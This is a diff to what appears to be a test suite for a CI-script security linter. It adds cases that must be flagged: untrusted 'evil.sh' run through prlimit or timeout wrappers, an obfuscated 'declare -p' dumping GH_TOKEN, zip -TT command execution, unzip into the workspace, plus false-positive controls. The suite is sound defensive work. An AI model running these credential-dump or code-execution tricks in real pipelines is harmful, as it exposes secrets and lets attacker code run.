@@ -31,6 +31,8 @@ t wrapper-flock 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail$
 # --- unmodeled wrappers (Codex P1: fakeroot/xvfb-run operands) ---
 t wrapper-fakeroot 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}fakeroot bash \"\${GITHUB_WORKSPACE}/evil.sh\""
 t wrapper-xvfb 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}xvfb-run bash \"\${GITHUB_WORKSPACE}/evil.sh\""
+t wrapper-prlimit 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}prlimit -- bash \"\${GITHUB_WORKSPACE}/evil.sh\""
+t wrapper-timeout 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}timeout 10 bash \"\${GITHUB_WORKSPACE}/evil.sh\""
 
 # --- git allowlist (subcommands fetch/diff/show/merge-base; -c quotePath) ---
 t git-clone-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git clone https://evil/x"
@@ -93,6 +95,9 @@ t stage-envscrub-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}env -u 
 t stage-export-bare 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}export"
 t stage-declare-p 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}declare -p GH_TOKEN"
 t stage-set-bare 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}set"
+# --- constructed dump flags (Codex P1: declare "$p") ---
+t declare-constructed 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf -v p %s -p; declare \"\$p\" GH_TOKEN | rev"
+t declare-assign-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}declare FOO=\"\$BAR\""
 t stage-export-value-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}export FOO=bar"
 t stage-poison-git-ssh 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}export GIT_SSH_COMMAND=/tmp/evil"
 t stage-poison-pager 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}PAGER=/tmp/evil"
@@ -179,6 +184,9 @@ t copy-tar-C-tmp-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}tar -xf
 # --- zip test command (Codex P1: -TT executes) ---
 t copy-zip-TT 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}zip -q -T -TT \"bash \${GITHUB_WORKSPACE}/evil.sh\" \"\${RUNNER_TEMP}/probe.zip\" /etc/hostname"
 t copy-zip-T-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}zip -q -T \"\${RUNNER_TEMP}/probe.zip\" /etc/hostname"
+# --- unzip destination (Codex P1: no -d extracts to CWD) ---
+t copy-unzip-noD 1 "helper-workspace-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}unzip -o \"\${GITHUB_WORKSPACE}/evil.zip\""
+t copy-unzip-d-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}unzip -o \"\${GITHUB_WORKSPACE}/evil.zip\" -d \"\${RUNNER_TEMP}\""
 t copy-sed-exec 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}sed 's/x/y/e' /tmp/f"
 t copy-sed-e-cmd 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}sed -e '/pat/e' /tmp/f"
 t copy-sed-w-trusted 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}sed 'w \${SCRIPT_DIR}/x' /tmp/f"
